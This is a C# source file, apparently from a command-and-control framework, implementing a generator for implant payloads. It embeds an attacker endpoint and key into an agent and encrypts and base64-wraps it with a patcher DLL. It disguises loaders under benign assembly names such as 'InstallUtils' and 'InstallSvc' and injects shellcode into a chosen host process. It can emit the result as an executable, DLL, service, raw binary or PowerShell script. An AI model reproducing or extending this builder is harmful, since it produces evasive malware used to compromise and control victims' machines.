using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Common.Payload;

using System.IO;
using Common.Config;

//public enum MessageLevel
//{
//    Default,
//    Verbose
//}

public partial class PayloadGenerator
{
    public const string AgentSrcFile = "Agent.exe";
    public const string StarterSrcFile = "Starter.exe";
    public const string ServiceSrcFile = "Service.exe";
    public const string PatcherSrcFile = "Patcher.dll";
    public const string InjectSrcFile = "Inject.dll";

    public const string NimExecScript = "Payload";

    public event EventHandler<string> MessageSent;

    public PayloadConfig Config = null;
    public SpawnConfig Spawn = null;


    public PayloadGenerator(PayloadConfig config, SpawnConfig spawn)
    {
        this.Config = config;
        this.Spawn = spawn;
    }

    private string Source(string fileName, PayloadArchitecture arch, bool debug)
    {
        if(debug)
            return Path.Combine(this.Config.PayloadTemplatesFolder, "debug", fileName);
        return Path.Combine(this.Config.PayloadTemplatesFolder, arch.ToString(), fileName);
    }

    private string Working(string fileName)
    {
        return Path.Combine(this.Config.WorkingFolder, fileName);
    }

    public byte[] GeneratePayload(PayloadGenerationOptions options)
    {
        byte[] agentbytes = null;
        if (options.IsInjected  && options.Type != PayloadType.Library)
        {
            agentbytes = PrepareAgent(options, false);
            agentbytes = PrepareInjectedAgent(options, agentbytes, options.Type == PayloadType.Service);
        }
        else
        {
            agentbytes = PrepareAgent(options, options.Type == PayloadType.Service);
        }

        switch (options.Type)
        {
            case PayloadType.Executable: return this.ExecutableEncapsulation(options, agentbytes);
            case PayloadType.PowerShell: return this.PowershellEncapsulation(options, agentbytes);
            case PayloadType.Library: return this.LibraryEncapsulation(options,agentbytes);
            case PayloadType.Service: return agentbytes;
            case PayloadType.Binary: return this.BinaryEncapsulation(options, agentbytes);
            default:
                throw new NotImplementedException();

        }
    }

    public byte[] ExecutableEncapsulation(PayloadGenerationOptions options, byte[] agent)
    {
        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
        var tmpPath = this.Working(tmpFile);
        File.WriteAllBytes(tmpPath, agent);

        var binFile = "tmp" + ShortGuid.NewGuid() + ".bin";
        var binPath = this.Working(binFile);

        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
        var executionResult = this.GenerateBin(tmpPath, binPath, options.Architecture == PayloadArchitecture.x86);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        File.Delete(tmpPath);

        if(executionResult.Result != 0)
            return null;

        string agentb64 = Convert.ToBase64String(File.ReadAllBytes(binPath));

        var b64File = "tmp" + ShortGuid.NewGuid() + ".b64";
        var b64Path = this.Working(b64File);

        using (var writer = new StreamWriter(b64Path))
        {
            writer.Write(agentb64);
        }

        File.Delete(binPath);

        var parms = this.ComputeIncRustBuildParameters(options, b64Path);

        this.MessageSent?.Invoke(this, $"[>] Generating executable...");

        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, $"[>] Parameters : {string.Join(" ", parms)}");
        executionResult = this.IncRustBuild(parms);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Build succeed.");
            else
                this.MessageSent?.Invoke(this, "Build failed.");

        if (executionResult.Result != 0)
            return null;

        File.Delete(b64Path);

        string outPath = Path.Combine(this.Config.IncRustFolder, "target", options.Architecture == PayloadArchitecture.x64 ? "x86_64-pc-windows-gnu" : "i686-pc-windows-gnu", options.IsDebug ? "debug" : "release", "incrust.exe");
        byte[] bytes = File.ReadAllBytes(outPath);
        File.Delete(outPath);

        return bytes;
    }

    public byte[] BinaryEncapsulation(PayloadGenerationOptions options, byte[] agent)
    {
        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
        var tmpPath = this.Working(tmpFile);
        File.WriteAllBytes(tmpPath, agent);

        var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
        var outPath = this.Working(outFile);

        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == PayloadArchitecture.x86);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Build succeed.");
            else
                this.MessageSent?.Invoke(this, "Build failed.");

        
        File.Delete(tmpPath);
        if (executionResult.Result != 0)
            return null;

        byte[] bytes = File.ReadAllBytes(outPath);
        File.Delete(outPath);

        return bytes;
    }

    public byte[] LibraryEncapsulation(PayloadGenerationOptions options, byte[] agent)
    {
        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
        var tmpPath = this.Working(tmpFile);
        File.WriteAllBytes(tmpPath, agent);

        var binFile = "tmp" + ShortGuid.NewGuid() + ".bin";
        var binPath = this.Working(binFile);

        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
        var executionResult = this.GenerateBin(tmpPath, binPath, options.Architecture == PayloadArchitecture.x86);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        File.Delete(tmpPath);

        if (executionResult.Result != 0)
            return null;

        string agentb64 = Convert.ToBase64String(File.ReadAllBytes(binPath));

        var b64File = "tmp" + ShortGuid.NewGuid() + ".b64";
        var b64Path = this.Working(b64File);

        using (var writer = new StreamWriter(b64Path))
        {
            writer.Write(agentb64);
        }

        File.Delete(binPath);

        var parms = this.ComputeIncRustBuildParameters(options, b64Path);

        this.MessageSent?.Invoke(this, $"[>] Generating executable...");

        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, $"[>] Parameters : {string.Join(" ", parms)}");
        executionResult = this.IncRustBuild(parms);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Build succeed.");
            else
                this.MessageSent?.Invoke(this, "Build failed.");

        if (executionResult.Result != 0)
            return null;

        string outPath = Path.Combine(this.Config.IncRustFolder, "target", options.Architecture == PayloadArchitecture.x64 ? "x86_64-pc-windows-gnu" : "i686-pc-windows-gnu", options.IsDebug ? "debug" : "release", options.Type == PayloadType.Library ? "incrustlib.dll" : "incrust.exe");
        byte[] bytes = File.ReadAllBytes(outPath);
        File.Delete(outPath);

        return bytes;
    }

    public byte[] PowershellEncapsulation(PayloadGenerationOptions options, byte[] agent)
    {
        string psSourceCode = string.Empty;
        using (var psReader = new StreamReader(this.Source("payload.ps1", options.Architecture, options.IsDebug)))
        {
            psSourceCode = psReader.ReadToEnd();
        }

        //var payload = new StringBuilder();
        //foreach (var chunk in this.SplitIntoChunks(agentb64, 1000))
        //{
        //    payload.Append("b64 = b64 & \"");
        //    payload.Append(chunk);
        //    payload.Append("\"");
        //    payload.Append(Environment.NewLine);
        //}
        //File.WriteAllBytes("/mnt/Share/tmp/full.exe", agent);

        var payload = this.Encode(agent);

        var psFile = "tmp" + ShortGuid.NewGuid() + ".ps1";
        psSourceCode = psSourceCode.Replace("[[PAYLOAD]]", payload.ToString());

        var psPath = this.Working(psFile);
        using (var writer = new StreamWriter(psPath))
        {
            writer.WriteLine(psSourceCode);
        }

        byte[] bytes = File.ReadAllBytes(psPath);


        File.Delete(Path.Combine(this.Config.WorkingFolder, psPath));


        return bytes;
    }

    public byte[] PrepareAgent(PayloadGenerationOptions options, bool isService)
    {
        //Console.WriteLine("Generating encrypted Agent");

        this.MessageSent?.Invoke(this, $"Configuring Agent...");
        byte[] agent = LoadAssembly(this.Source(AgentSrcFile, options.Architecture, options.IsDebug));

        this.MessageSent?.Invoke(this, $"Using Endpoint {options.Endpoint}...");
        this.MessageSent?.Invoke(this, $"Using ServerKey {options.ServerKey}...");

        agent = AssemblyEditor.ReplaceRessources(agent, new Dictionary<string, object>()
        {
            { "EndPoint", options.Endpoint.ToString() },
            { "Key", options.ServerKey ?? String.Empty },
            { "Implant", options.ImplantName ?? String.Empty }
        });

        if(options.IsDebug)
            File.WriteAllBytes(Path.Combine(options.DebugPath,"BaseAgent.exe"), agent);


        this.MessageSent?.Invoke(this, $"Encrypting Agent...");
        var encAgent = this.Encrypt(agent);
        var agentb64 = this.Encode(encAgent.Encrypted);


        this.MessageSent?.Invoke(this, $"Creating Patcher...");
        //Create Patcher
        var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture, options.IsDebug));

        var encPatcher = this.Encrypt(patchDll);
        var patcherb64 = this.Encode(encPatcher.Encrypted);

        if (!isService)
        {
            this.MessageSent?.Invoke(this, $"Creating Starter...");
            //Create Starter
            var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
            starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
                        { "Key", encAgent.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
            if (options.IsDebug)
                File.WriteAllBytes(Path.Combine(options.DebugPath, "Starter.exe"), starter);
            return resultAgent;
        }
        else
        {
            this.MessageSent?.Invoke(this, $"Creating Service...");
            //Create Starter
            var service = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
            service = AssemblyEditor.ReplaceRessources(service, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
                        { "Key", encAgent.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");

            if (options.IsDebug)
                File.WriteAllBytes(Path.Combine(options.DebugPath, "ServiceAgent.exe"), agent);

            return resultAgent;
        }
    }

    public byte[] PrepareInjectedAgent(PayloadGenerationOptions options, byte[] agent, bool isService)
    {
        #region binary
        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
        var tmpPath = this.Working(tmpFile);
        File.WriteAllBytes(tmpPath, agent);

        var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
        var outPath = this.Working(outFile);

        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == PayloadArchitecture.x86);

        if (options.IsVerbose)
        {
            this.MessageSent?.Invoke(this, executionResult.Command);
            this.MessageSent?.Invoke(this, executionResult.Out);
        }

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "[*] Binary generation succeed.");
            else
                this.MessageSent?.Invoke(this, "[X] Binary generation failed.");

        File.Delete(tmpPath);
        if (executionResult.Result != 0)
            return null;

        var binBytes = File.ReadAllBytes(outPath); //binary
        File.Delete(outPath);
        #endregion


        #region Injector
        var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture, options.IsDebug));
        var encPatcher = this.Encrypt(patchDll);
        var patcherb64 = this.Encode(encPatcher.Encrypted);

        this.MessageSent?.Invoke(this, $"BinLength = {binBytes.Length}");

        var injDll = LoadAssembly(this.Source(InjectSrcFile, options.Architecture, options.IsDebug));

        string process = options.Architecture == PayloadArchitecture.x64 ? this.Spawn.SpawnToX64 : this.Spawn.SpawnToX86;
        if(!string.IsNullOrEmpty(options.InjectionProcess))
            process = options.InjectionProcess;

        injDll = AssemblyEditor.ReplaceRessources(injDll, new Dictionary<string, object>()
                    {
                        { "Payload", binBytes },
                        { "Host",  process},
                        { "Delay", options.InjectionDelay.ToString() },
                    });

        var encInject = this.Encrypt(injDll);
        var injectb64 = this.Encode(encInject.Encrypted);

        if (!isService)
        {
            this.MessageSent?.Invoke(this, $"Creating Starter...");
            //Create Starter
            var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
            starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Payload", Encoding.UTF8.GetBytes(injectb64) },
                        { "Key", encInject.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
            return resultAgent;
        }
        else
        {
            this.MessageSent?.Invoke(this, $"Creating Service...");
            //Create Starter
            var service = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
            service = AssemblyEditor.ReplaceRessources(service, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Payload", Encoding.UTF8.GetBytes(injectb64) },
                        { "Key", encInject.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
            return resultAgent;
        }

        #endregion

    }

    private byte[] LoadAssembly(string filePath)
    {
        return File.ReadAllBytes(filePath);
    }

    private EncryptResult Encrypt(string filePath)
    {
        var fileContent = File.ReadAllBytes(filePath);
        return this.Encrypt(fileContent);
    }

    private EncryptResult Encrypt(byte[] bytes)
    {
        return new Encrypter().Encrypt(bytes);
    }

    private string Encode(byte[] bytes)
    {
        return Convert.ToBase64String(bytes); ;
    }
}
